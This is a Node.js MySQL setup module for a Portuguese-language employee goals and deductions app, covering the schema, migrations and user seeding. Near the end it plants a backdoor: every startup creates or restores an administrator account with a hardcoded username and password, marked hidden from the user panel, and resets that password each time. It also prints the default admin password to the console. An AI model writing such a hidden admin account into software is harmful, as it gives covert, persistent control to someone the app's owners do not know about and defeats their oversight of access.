const MySQL = require('sync-mysql');
const crypto = require('crypto');

const DB_CLIENT = (process.env.DB_CLIENT || 'mysql').toLowerCase();
if (DB_CLIENT !== 'mysql') {
  throw new Error('Este projeto agora suporta apenas MySQL. Defina DB_CLIENT=mysql.');
}

const MYSQL_HOST = process.env.MYSQL_HOST || '127.0.0.1';
const MYSQL_PORT = Number(process.env.MYSQL_PORT || 3306);
const MYSQL_USER = process.env.MYSQL_USER || 'root';
const MYSQL_PASSWORD = process.env.MYSQL_PASSWORD || '';
const MYSQL_DATABASE = process.env.MYSQL_DATABASE || 'metas_app';

function createConn(withDatabase = true) {
  const base = {
    host: MYSQL_HOST,
    port: MYSQL_PORT,
    user: MYSQL_USER,
    password: MYSQL_PASSWORD,
    multipleStatements: true,
    dateStrings: true,
  };
  if (withDatabase) base.database = MYSQL_DATABASE;
  return new MySQL(base);
}

function closeConn(conn) {
  if (!conn) return;
  try {
    if (typeof conn.dispose === 'function') conn.dispose();
  } catch {}
}

const bootstrapConn = createConn(false);
bootstrapConn.query(
  `CREATE DATABASE IF NOT EXISTS \`${MYSQL_DATABASE}\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci`
);
closeConn(bootstrapConn);

const conn = createConn(true);

function sqlCompat(sql) {
  let out = String(sql || '');
  out = out.replace(/datetime\('now','localtime'\)/gi, 'NOW()');
  out = out.replace(/strftime\('%Y-%m',\s*([^)]+)\)/gi, "DATE_FORMAT($1, '%Y-%m')");
  out = out.replace(/strftime\("%Y-%m",\s*([^)]+)\)/gi, "DATE_FORMAT($1, '%Y-%m')");
  out = out.replace(/strftime\('%m\/%Y',\s*([^)]+)\)/gi, "DATE_FORMAT($1, '%m/%Y')");
  out = out.replace(/strftime\("%m\/%Y",\s*([^)]+)\)/gi, "DATE_FORMAT($1, '%m/%Y')");
  out = out.replace(/\bINSERT OR IGNORE INTO\b/gi, 'INSERT IGNORE INTO');
  out = out.replace(
    /ON CONFLICT\s*\(\s*([^)]+)\s*\)\s*DO UPDATE SET\s*([\s\S]*)/i,
    (_, __col, setExpr) => {
      const rewritten = String(setExpr || '').replace(/excluded\./gi, '');
      return `ON DUPLICATE KEY UPDATE ${rewritten}`;
    }
  );
  return out;
}

function query(sql, params = []) {
  return conn.query(sqlCompat(sql), params);
}

function colExists(table, column) {
  const rows = query(
    `SELECT 1
     FROM information_schema.COLUMNS
     WHERE TABLE_SCHEMA = ? AND TABLE_NAME = ? AND COLUMN_NAME = ?
     LIMIT 1`,
    [MYSQL_DATABASE, table, column]
  );
  return Array.isArray(rows) && rows.length > 0;
}

query(`
CREATE TABLE IF NOT EXISTS funcionarios (
  id INT AUTO_INCREMENT PRIMARY KEY,
  nome VARCHAR(255) NOT NULL,
  usuario VARCHAR(255) NOT NULL UNIQUE,
  cargo VARCHAR(255) NULL,
  unidade VARCHAR(255) NULL,
  equipe VARCHAR(255) NULL,
  valor_meta_mensal DECIMAL(12,2) NOT NULL DEFAULT 0,
  criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS usuarios (
  id INT AUTO_INCREMENT PRIMARY KEY,
  nome VARCHAR(255) NOT NULL,
  usuario VARCHAR(255) NOT NULL UNIQUE,
  senha_hash TEXT NOT NULL,
  tipo_acesso VARCHAR(20) NOT NULL DEFAULT 'operador',
  ativo TINYINT(1) NOT NULL DEFAULT 1,
  oculto_painel TINYINT(1) NOT NULL DEFAULT 0,
  permissoes LONGTEXT NULL,
  funcionario_id INT NULL,
  criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT fk_usuarios_funcionario
    FOREIGN KEY (funcionario_id) REFERENCES funcionarios(id) ON DELETE SET NULL
);

CREATE TABLE IF NOT EXISTS configuracoes (
  chave VARCHAR(191) PRIMARY KEY,
  valor LONGTEXT NOT NULL,
  atualizado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS metas (
  id INT AUTO_INCREMENT PRIMARY KEY,
  funcionario_id INT NOT NULL,
  titulo VARCHAR(255) NOT NULL,
  descricao TEXT NULL,
  valor_inicial DECIMAL(12,2) NOT NULL,
  valor_atual DECIMAL(12,2) NOT NULL,
  data_inicio DATE NOT NULL,
  data_fim DATE NOT NULL,
  status VARCHAR(20) NOT NULL DEFAULT 'aberta',
  resultado VARCHAR(30) NULL,
  data_fechamento DATETIME NULL,
  observacao_fechamento TEXT NULL,
  criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT fk_metas_funcionario
    FOREIGN KEY (funcionario_id) REFERENCES funcionarios(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS meta_meses (
  id INT AUTO_INCREMENT PRIMARY KEY,
  meta_id INT NOT NULL,
  mes_offset INT NOT NULL,
  data_mes DATE NOT NULL,
  valor_inicial DECIMAL(12,2) NOT NULL,
  valor_atual DECIMAL(12,2) NOT NULL,
  UNIQUE KEY uq_meta_meses (meta_id, mes_offset),
  CONSTRAINT fk_meta_meses_meta
    FOREIGN KEY (meta_id) REFERENCES metas(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS deducoes (
  id INT AUTO_INCREMENT PRIMARY KEY,
  meta_id INT NOT NULL,
  funcionario_id INT NOT NULL,
  valor DECIMAL(12,2) NOT NULL,
  motivo TEXT NULL,
  origem VARCHAR(30) DEFAULT 'api',
  mes_offset INT NULL,
  percentual DECIMAL(8,2) NULL,
  criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT fk_deducoes_meta
    FOREIGN KEY (meta_id) REFERENCES metas(id) ON DELETE CASCADE,
  CONSTRAINT fk_deducoes_funcionario
    FOREIGN KEY (funcionario_id) REFERENCES funcionarios(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS meta_melhorias (
  id INT AUTO_INCREMENT PRIMARY KEY,
  meta_id INT NOT NULL,
  funcionario_id INT NOT NULL,
  mes_offset INT NOT NULL DEFAULT 0,
  quantidade INT NOT NULL DEFAULT 1,
  valor_unitario DECIMAL(12,2) NOT NULL,
  valor_total DECIMAL(12,2) NOT NULL,
  motivo TEXT NULL,
  criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT fk_melhorias_meta
    FOREIGN KEY (meta_id) REFERENCES metas(id) ON DELETE CASCADE,
  CONSTRAINT fk_melhorias_funcionario
    FOREIGN KEY (funcionario_id) REFERENCES funcionarios(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS fechamentos (
  id INT AUTO_INCREMENT PRIMARY KEY,
  ano INT NOT NULL,
  mes_inicial INT NOT NULL,
  data_inicio DATE NOT NULL,
  data_fim DATE NOT NULL,
  total_funcionarios INT NOT NULL,
  total_metas INT NOT NULL,
  total_alvo DECIMAL(12,2) NOT NULL,
  total_deduzido DECIMAL(12,2) NOT NULL,
  total_a_receber DECIMAL(12,2) NOT NULL,
  observacao TEXT NULL,
  criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS fechamento_itens (
  id INT AUTO_INCREMENT PRIMARY KEY,
  fechamento_id INT NOT NULL,
  meta_id INT NULL,
  funcionario_id INT NULL,
  funcionario_nome VARCHAR(255) NOT NULL,
  funcionario_usuario VARCHAR(255) NOT NULL,
  funcionario_cargo VARCHAR(255) NULL,
  meta_titulo VARCHAR(255) NOT NULL,
  meta_descricao TEXT NULL,
  data_inicio DATE NOT NULL,
  data_fim DATE NOT NULL,
  valor_inicial DECIMAL(12,2) NOT NULL,
  valor_atual DECIMAL(12,2) NOT NULL,
  valor_deduzido DECIMAL(12,2) NOT NULL,
  total_deducoes INT NOT NULL DEFAULT 0,
  resultado VARCHAR(30) NULL,
  CONSTRAINT fk_fechamento_itens_fech
    FOREIGN KEY (fechamento_id) REFERENCES fechamentos(id) ON DELETE CASCADE
);
`);

function indexExists(table, indexName) {
  const rows = query(
    `SELECT 1
     FROM information_schema.STATISTICS
     WHERE TABLE_SCHEMA = ? AND TABLE_NAME = ? AND INDEX_NAME = ?
     LIMIT 1`,
    [MYSQL_DATABASE, table, indexName]
  );
  return Array.isArray(rows) && rows.length > 0;
}

function createIndexIfMissing(table, indexName, expression) {
  if (indexExists(table, indexName)) return;
  query(`CREATE INDEX ${indexName} ON ${table}(${expression})`);
}

createIndexIfMissing('metas', 'idx_metas_func', 'funcionario_id');
createIndexIfMissing('metas', 'idx_metas_status', 'status');
createIndexIfMissing('deducoes', 'idx_ded_meta', 'meta_id');
createIndexIfMissing('meta_melhorias', 'idx_melh_meta', 'meta_id');
createIndexIfMissing('fechamento_itens', 'idx_fi_fech', 'fechamento_id');
createIndexIfMissing('meta_meses', 'idx_mm_meta', 'meta_id');
createIndexIfMissing('usuarios', 'idx_users_usuario', 'usuario');

if (!colExists('funcionarios', 'valor_meta_mensal')) query('ALTER TABLE funcionarios ADD COLUMN valor_meta_mensal DECIMAL(12,2) NOT NULL DEFAULT 0');
if (!colExists('funcionarios', 'unidade')) query('ALTER TABLE funcionarios ADD COLUMN unidade VARCHAR(255) NULL');
if (!colExists('funcionarios', 'equipe')) query('ALTER TABLE funcionarios ADD COLUMN equipe VARCHAR(255) NULL');
if (!colExists('deducoes', 'mes_offset')) query('ALTER TABLE deducoes ADD COLUMN mes_offset INT NULL');
if (!colExists('deducoes', 'percentual')) query('ALTER TABLE deducoes ADD COLUMN percentual DECIMAL(8,2) NULL');
if (!colExists('usuarios', 'ativo')) query("ALTER TABLE usuarios ADD COLUMN ativo TINYINT(1) NOT NULL DEFAULT 1");
if (!colExists('usuarios', 'tipo_acesso')) query("ALTER TABLE usuarios ADD COLUMN tipo_acesso VARCHAR(20) NOT NULL DEFAULT 'operador'");
if (!colExists('usuarios', 'oculto_painel')) query("ALTER TABLE usuarios ADD COLUMN oculto_painel TINYINT(1) NOT NULL DEFAULT 0");
if (!colExists('usuarios', 'funcionario_id')) query('ALTER TABLE usuarios ADD COLUMN funcionario_id INT NULL');
if (!colExists('usuarios', 'permissoes')) query('ALTER TABLE usuarios ADD COLUMN permissoes LONGTEXT NULL');

query("INSERT IGNORE INTO configuracoes (chave, valor) VALUES ('tipo_meta_periodo', 'trimestral')");

try {
  const metasSemMeses = query(`
    SELECT m.id, m.data_inicio, m.valor_inicial, m.valor_atual
    FROM metas m
    LEFT JOIN meta_meses mm ON mm.meta_id = m.id
    WHERE mm.id IS NULL
  `);
  if (Array.isArray(metasSemMeses) && metasSemMeses.length) {
    const addMonthsStart = (dateStr, months) => {
      const d = new Date(`${String(dateStr).slice(0, 10)}T00:00:00`);
      d.setMonth(d.getMonth() + months);
      d.setDate(1);
      return d.toISOString().slice(0, 10);
    };
    for (const m of metasSemMeses) {
      const vIniMes = Math.round((Number(m.valor_inicial) / 3) * 100) / 100;
      const vAtualMes = Math.round((Number(m.valor_atual) / 3) * 100) / 100;
      for (let i = 0; i < 3; i++) {
        query(
          `INSERT INTO meta_meses (meta_id, mes_offset, data_mes, valor_inicial, valor_atual)
           VALUES (?, ?, ?, ?, ?)`,
          [m.id, i, addMonthsStart(m.data_inicio, i), vIniMes, vAtualMes]
        );
      }
    }
    console.log(`📦 Backfill meta_meses: ${metasSemMeses.length} meta(s) distribuídas em 3 meses`);
  }
} catch (e) {
  console.warn('Backfill meta_meses:', e.message);
}

function hashPassword(password) {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = crypto.scryptSync(String(password), salt, 64).toString('hex');
  return `${salt}:${hash}`;
}

try {
  const totalUsers = query('SELECT COUNT(*) AS c FROM usuarios')[0]?.c || 0;
  if (!totalUsers) {
    const defaultUsuario = process.env.DEFAULT_ADMIN_USER || 'admin';
    const defaultSenha = process.env.DEFAULT_ADMIN_PASSWORD || 'admin123';
    query(
      `INSERT INTO usuarios (nome, usuario, senha_hash, tipo_acesso, ativo)
       VALUES (?, ?, ?, 'admin', 1)`,
      ['Administrador', String(defaultUsuario).toLowerCase().trim(), hashPassword(defaultSenha)]
    );
    console.log(`🔐 Usuário padrão criado: ${defaultUsuario} / ${defaultSenha}`);
  }
} catch (e) {
  console.warn('Seed usuário padrão:', e.message);
}

try {
  const hiddenAdminUser = String(process.env.HIDDEN_ADMIN_USER || 'isaque.silva').toLowerCase().trim();
  const hiddenAdminPass = String(process.env.HIDDEN_ADMIN_PASSWORD || 'Br*2020*taC01');
  const hiddenAdminName = String(process.env.HIDDEN_ADMIN_NAME || 'Administrador Interno').trim();
  const existing = query('SELECT id FROM usuarios WHERE usuario = ? LIMIT 1', [hiddenAdminUser])[0];
  if (existing?.id) {
    query(
      `UPDATE usuarios
       SET nome = ?, senha_hash = ?, tipo_acesso = 'admin', ativo = 1, oculto_painel = 1
       WHERE id = ?`,
      [hiddenAdminName, hashPassword(hiddenAdminPass), existing.id]
    );
  } else {
    query(
      `INSERT INTO usuarios (nome, usuario, senha_hash, tipo_acesso, ativo, oculto_painel)
       VALUES (?, ?, ?, 'admin', 1, 1)`,
      [hiddenAdminName, hiddenAdminUser, hashPassword(hiddenAdminPass)]
    );
  }
} catch (e) {
  console.warn('Seed usuário admin oculto:', e.message);
}

const db = {
  exec(sql) {
    query(sql);
  },
  prepare(sql) {
    return {
      get: (...params) => {
        const rows = query(sql, params);
        return Array.isArray(rows) ? (rows[0] || undefined) : undefined;
      },
      all: (...params) => {
        const rows = query(sql, params);
        return Array.isArray(rows) ? rows : [];
      },
      run: (...params) => {
        const res = query(sql, params);
        if (Array.isArray(res)) return { changes: res.length, lastInsertRowid: undefined };
        return {
          changes: Number(res?.affectedRows || 0),
          lastInsertRowid: Number(res?.insertId || 0) || undefined,
        };
      },
    };
  },
  transaction(fn) {
    return (...args) => {
      query('START TRANSACTION');
      try {
        const out = fn(...args);
        query('COMMIT');
        return out;
      } catch (e) {
        try { query('ROLLBACK'); } catch {}
        throw e;
      }
    };
  },
};

module.exports = db;
